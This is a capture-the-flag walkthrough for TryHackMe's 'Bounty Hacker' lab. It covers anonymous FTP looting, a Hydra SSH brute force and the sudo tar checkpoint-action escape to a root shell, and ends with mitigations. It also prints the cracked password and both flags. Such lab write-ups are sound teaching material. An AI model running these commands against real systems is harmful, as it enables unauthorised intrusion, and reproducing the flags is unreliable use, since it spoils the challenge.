# Bounty Hacker CTF Walkthrough

**Target:** Bounty Hacker  
**Source:** [TryHackMe](https://tryhackme.com/room/cowboyhacker)  
**Difficulty:** Easy  
**Target IP:** 10.112.171.113

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [FTP Anonymous Access](#ftp-anonymous-access)
- [SSH Brute Force](#ssh-brute-force)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

Bounty Hacker is an easy, Cowboy Bebop themed Linux box. The objective is to gain
a foothold on the system and escalate to root, capturing both the user and root
flags along the way. The attack chain covers anonymous FTP access to recover a
wordlist and a username, an SSH brute force to crack a valid password, and a
`sudo` misconfiguration with `tar` (a known GTFOBins technique) for root.

**Key Skills Required:**
- Network scanning and service enumeration
- Web source review
- Anonymous FTP enumeration and file retrieval
- Password brute forcing with Hydra
- Linux privilege escalation via `sudo` GTFOBins (`tar`)

---

## Reconnaissance

### Network Scanning

```bash
nmap 10.112.171.113
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.5 |
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu) |

A more aggressive scan confirms the versions and reveals that anonymous FTP login
is permitted:

```bash
nmap -A -T4 -Pn 10.112.171.113
```

```
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Three ports are open: FTP allowing anonymous login, SSH, and an Apache web
server. The FTP anonymous disclosure is the most promising lead.

---

## Web Enumeration

### Landing Page

```bash
curl http://10.112.171.113
```

The page displays a Cowboy Bebop themed scene with a crew picture and dialogue
from Spike, Jet, Ed, and Faye taunting the player to root the system. There is no
hidden credential or directory in the source — the page is purely thematic flavour
and does not advance the attack.

---

## FTP Anonymous Access

Anonymous login is allowed, so the FTP share can be browsed without credentials:

```bash
ftp 10.112.171.113
Name (10.112.171.113:kali): anonymous
230 Login successful.
```

```bash
ftp> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

### task.txt — Recovering the Username

```bash
ftp> more task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

The task list is signed `-lin`, disclosing a likely username.

> **Username:** `lin`

### locks.txt — A Candidate Password List

```bash
ftp> more locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
...
```

`locks.txt` contains 26 password-style strings — an obvious candidate wordlist for
brute forcing. Both files are pulled down locally:

```bash
ftp> get locks.txt
ftp> get task.txt
ftp> quit
```

---

## SSH Brute Force

With a username (`lin`) and a wordlist (`locks.txt`), SSH is the natural service
to attack. Hydra is used to spray the candidate passwords against SSH:

```bash
hydra ssh://10.112.171.113 -l lin -P locks.txt
```

```
[22][ssh] host: 10.112.171.113   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

> **Valid credentials:** `lin : RedDr4gonSynd1cat3`

---

## User Flag

The recovered credentials grant an interactive SSH session:

```bash
ssh lin@10.112.171.113
lin@10.112.171.113's password:
Welcome to Ubuntu 20.04.6 LTS
```

The user flag sits on the desktop:

```bash
lin@ip-10-112-171-113:~/Desktop$ ls
user.txt
lin@ip-10-112-171-113:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

> **User flag:** `THM{CR1M3_SyNd1C4T3}`

---

## Privilege Escalation

Checking `sudo` privileges reveals that `lin` may run `/bin/tar` as root:

```bash
lin@ip-10-112-171-113:~/Desktop$ sudo -l
User lin may run the following commands on ip-10-112-171-113:
    (root) /bin/tar
```

`tar` has a well-known GTFOBins escape: its `--checkpoint-action` option can
execute an arbitrary command. Running it as root spawns a root shell:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
```

The root flag is then read directly:

```bash
# cd /root
# ls
root.txt  snap
# cat root.txt
THM{80UN7Y_h4cK3r}
```

> **Root flag:** `THM{80UN7Y_h4cK3r}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{CR1M3_SyNd1C4T3}` | `/home/lin/Desktop/user.txt` |
| Root flag | `THM{80UN7Y_h4cK3r}` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Anonymous FTP Access with Sensitive Files (High)

**Description:** The FTP service (`vsftpd 3.0.5`) permitted anonymous login, and
the share contained `task.txt` (disclosing the username `lin`) and `locks.txt`
(a usable password wordlist), all readable without authentication.

**Impact:** A valid username and a curated password list were handed to the
attacker, directly enabling the SSH brute force.

**Mitigation:**
- Disable anonymous FTP unless explicitly required.
- Never store usernames, password lists, or other sensitive material on a
  publicly accessible share.

### 2. Weak / Brute-Forceable SSH Credentials (High)

**Description:** The `lin` account used a password (`RedDr4gonSynd1cat3`) that was
present in an attacker-accessible wordlist, allowing a trivial Hydra brute force
over SSH.

**Impact:** Initial foothold on the host as the `lin` user.

**Mitigation:**
- Enforce strong, unique passwords and account lockout / rate limiting.
- Prefer key-based SSH authentication and disable password login where possible.

### 3. Sudo Misconfiguration — `tar` GTFOBins (Critical)

**Description:** The `lin` account was granted `sudo` rights to run `/bin/tar` as
root. `tar`'s `--checkpoint-action=exec=` option allows arbitrary command
execution, escaping to a root shell.

**Impact:** Full privilege escalation from `lin` to `root`.

**Mitigation:**
- Apply least privilege in `sudoers`; avoid granting `sudo` on binaries with
  known shell-escape vectors (see GTFOBins).
- Restrict `sudo` rights to the specific, non-escapable commands a user needs.

---

## Attack Chain Summary

```
Nmap scan → 3 open ports (FTP, SSH, HTTP)
    ↓
Anonymous FTP login allowed
    ↓
task.txt → username lin
    ↓
locks.txt → candidate password wordlist
    ↓
Hydra SSH brute force → password RedDr4gonSynd1cat3
    ↓
SSH login (lin : RedDr4gonSynd1cat3)
    ↓
User flag: THM{CR1M3_SyNd1C4T3} (~/Desktop/user.txt)
    ↓
sudo -l → (root) /bin/tar
    ↓
tar --checkpoint-action=exec=/bin/sh → root shell
    ↓
Root flag: THM{80UN7Y_h4cK3r} (/root/root.txt)
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| curl | Web source review |
| ftp | Anonymous FTP enumeration and file retrieval |
| Hydra | SSH password brute forcing |
| SSH | Authenticated remote access |
| tar | Sudo GTFOBins privilege escalation |

---

## References

- [TryHackMe — Bounty Hacker](https://tryhackme.com/room/cowboyhacker)
- [Nmap](https://nmap.org/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)

---
